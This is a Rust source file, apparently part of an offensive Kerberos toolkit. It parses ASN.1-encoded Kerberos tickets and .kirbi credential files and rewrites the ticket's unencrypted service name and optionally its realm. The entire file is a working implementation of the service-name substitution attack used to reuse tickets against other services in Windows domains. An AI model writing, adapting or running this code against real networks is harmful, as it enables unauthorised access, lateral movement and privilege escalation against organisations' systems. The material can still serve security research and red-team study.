use std::error::Error;

pub fn substitute_service(
    ticket_data: &[u8],
    new_service: &str,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let parts: Vec<&str> = new_service.split('/').collect();
    let new_sname = encode_principal_name(2, &parts);

    let inner = unwrap_application(ticket_data)?;

    let mut result = Vec::new();
    let mut pos = 0;
    let mut replaced = false;

    while pos < inner.len() {
        let tag = inner[pos];
        let tag_start = pos;
        pos += 1;
        let len = parse_asn1_length(&inner, &mut pos)?;
        let content_end = pos + len;
        if content_end > inner.len() {
            return Err("truncated ASN.1 in ticket".into());
        }

        let ctx = tag & 0x1f;
        if (tag & 0xe0 == 0xa0) && ctx == 2 && !replaced {
            result.extend(encode_context_tag(2, &new_sname));
            replaced = true;
        } else {
            result.extend_from_slice(&inner[tag_start..content_end]);
        }
        pos = content_end;
    }

    if !replaced {
        return Err("sname context tag [2] not found in ticket".into());
    }

    let seq = encode_sequence_raw(&[&result]);
    Ok(encode_application_tag(ticket_data[0] & 0x1f, &seq))
}

pub fn substitute_service_in_kirbi(
    kirbi: &[u8],
    new_service: &str,
    new_realm: Option<&str>,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let krb_cred_inner = unwrap_application(kirbi)?;

    let tickets_raw = extract_context_tag_content(&krb_cred_inner, 2)
        .ok_or("tickets field [2] not found in KRB-CRED")?;
    let tickets_inner = unwrap_sequence_bytes(&tickets_raw);
    if tickets_inner.is_empty() {
        return Err("empty tickets in KRB-CRED".into());
    }

    let first_ticket_start = find_first_ticket(&tickets_inner)?;
    let ticket_bytes = &tickets_inner[first_ticket_start..];

    let mut modified_ticket = substitute_service(ticket_bytes, new_service)?;

    if let Some(realm) = new_realm {
        modified_ticket = substitute_realm(&modified_ticket, realm)?;
    }

    let new_tickets_seq = encode_sequence_raw(&[&modified_ticket]);

    let mut new_krb_cred = Vec::new();
    let mut pos = 0;
    while pos < krb_cred_inner.len() {
        let tag = krb_cred_inner[pos];
        let tag_start = pos;
        pos += 1;
        let len = parse_asn1_length(&krb_cred_inner, &mut pos)?;
        let content_end = pos + len;
        if content_end > krb_cred_inner.len() {
            return Err("truncated KRB-CRED".into());
        }

        let ctx = tag & 0x1f;
        if (tag & 0xe0 == 0xa0) && ctx == 2 {
            new_krb_cred.extend(encode_context_tag(2, &new_tickets_seq));
        } else {
            new_krb_cred.extend_from_slice(&krb_cred_inner[tag_start..content_end]);
        }
        pos = content_end;
    }

    let seq = encode_sequence_raw(&[&new_krb_cred]);
    Ok(encode_application_tag(22, &seq))
}

fn substitute_realm(ticket_data: &[u8], new_realm: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let inner = unwrap_application(ticket_data)?;
    let new_realm_enc = encode_general_string(new_realm);

    let mut result = Vec::new();
    let mut pos = 0;
    let mut replaced = false;

    while pos < inner.len() {
        let tag = inner[pos];
        let tag_start = pos;
        pos += 1;
        let len = parse_asn1_length(&inner, &mut pos)?;
        let content_end = pos + len;
        if content_end > inner.len() {
            break;
        }

        let ctx = tag & 0x1f;
        if (tag & 0xe0 == 0xa0) && ctx == 1 && !replaced {
            result.extend(encode_context_tag(1, &new_realm_enc));
            replaced = true;
        } else {
            result.extend_from_slice(&inner[tag_start..content_end]);
        }
        pos = content_end;
    }

    let seq = encode_sequence_raw(&[&result]);
    Ok(encode_application_tag(ticket_data[0] & 0x1f, &seq))
}

fn find_first_ticket(data: &[u8]) -> Result<usize, Box<dyn Error>> {
    // Look for APPLICATION[1] (0x61) which is a Ticket
    for i in 0..data.len() {
        if data[i] == 0x61 {
            return Ok(i);
        }
    }
    Ok(0)
}

pub fn print_substitution(original_sname: &[String], new_service: &str) {
    println!("  Original : {}", original_sname.join("/"));
    println!("  New      : {}", new_service);
    println!("  Status   : Service name substituted");
}

// --- ASN.1 helpers ---

fn unwrap_application(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    if data.is_empty() {
        return Err("empty data".into());
    }
    let tag = data[0];
    if tag & 0x60 != 0x60 && tag != 0x30 {
        return Err(format!("unexpected tag 0x{:02x}", tag).into());
    }
    let mut pos = 1;
    let len = parse_asn1_length(data, &mut pos)?;
    if pos + len > data.len() {
        return Err("truncated data".into());
    }
    let content = &data[pos..pos + len];
    if !content.is_empty() && content[0] == 0x30 {
        let mut spos = 1;
        let slen = parse_asn1_length(content, &mut spos)?;
        if spos + slen <= content.len() {
            return Ok(content[spos..spos + slen].to_vec());
        }
    }
    Ok(content.to_vec())
}

fn unwrap_sequence_bytes(data: &[u8]) -> Vec<u8> {
    if data.is_empty() || data[0] != 0x30 {
        return data.to_vec();
    }
    let mut pos = 1;
    let len = match parse_asn1_length(data, &mut pos) {
        Ok(l) => l,
        Err(_) => return data.to_vec(),
    };
    if pos + len <= data.len() {
        data[pos..pos + len].to_vec()
    } else {
        data.to_vec()
    }
}

fn extract_context_tag_content(data: &[u8], target_tag: u8) -> Option<Vec<u8>> {
    let mut pos = 0;
    while pos < data.len() {
        let tag = data[pos];
        pos += 1;
        let len = parse_asn1_length(data, &mut pos).ok()?;
        if pos + len > data.len() {
            return None;
        }
        let ctx = tag & 0x1f;
        if (tag & 0xe0 == 0xa0) && ctx == target_tag {
            return Some(data[pos..pos + len].to_vec());
        }
        pos += len;
    }
    None
}

fn parse_asn1_length(data: &[u8], pos: &mut usize) -> Result<usize, Box<dyn Error>> {
    if *pos >= data.len() {
        return Err("unexpected end".into());
    }
    let first = data[*pos];
    *pos += 1;
    if first < 0x80 {
        return Ok(first as usize);
    }
    let num_bytes = (first & 0x7f) as usize;
    if num_bytes > 4 || *pos + num_bytes > data.len() {
        return Err("invalid length".into());
    }
    let mut len = 0usize;
    for _ in 0..num_bytes {
        len = (len << 8) | (data[*pos] as usize);
        *pos += 1;
    }
    Ok(len)
}

fn encode_length(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else {
        vec![0x82, (len >> 8) as u8, len as u8]
    }
}

fn encode_sequence_raw(items: &[&[u8]]) -> Vec<u8> {
    let mut c = Vec::new();
    for i in items {
        c.extend_from_slice(i);
    }
    let mut o = vec![0x30];
    o.extend(encode_length(c.len()));
    o.extend(c);
    o
}

fn encode_context_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![0xa0 | tag];
    o.extend(encode_length(content.len()));
    o.extend(content);
    o
}

fn encode_application_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut o = vec![0x60 | tag];
    o.extend(encode_length(content.len()));
    o.extend(content);
    o
}

fn encode_general_string(s: &str) -> Vec<u8> {
    let mut o = vec![0x1b];
    o.extend(encode_length(s.len()));
    o.extend(s.as_bytes());
    o
}

fn encode_integer(val: i32) -> Vec<u8> {
    let mut o = vec![0x02];
    if val >= 0 && val < 128 {
        o.extend(encode_length(1));
        o.push(val as u8);
    } else {
        let b = val.to_be_bytes();
        let s = b.iter().position(|&x| x != 0).unwrap_or(3);
        o.extend(encode_length(b.len() - s));
        o.extend(&b[s..]);
    }
    o
}

fn encode_principal_name(name_type: i32, names: &[&str]) -> Vec<u8> {
    let nt = encode_integer(name_type);
    let mut ns = Vec::new();
    for n in names {
        ns.extend(encode_general_string(n));
    }
    let nseq = encode_sequence_raw(&[&ns]);
    let mut c = Vec::new();
    c.extend(encode_context_tag(0, &nt));
    c.extend(encode_context_tag(1, &nseq));
    encode_sequence_raw(&[&c])
}
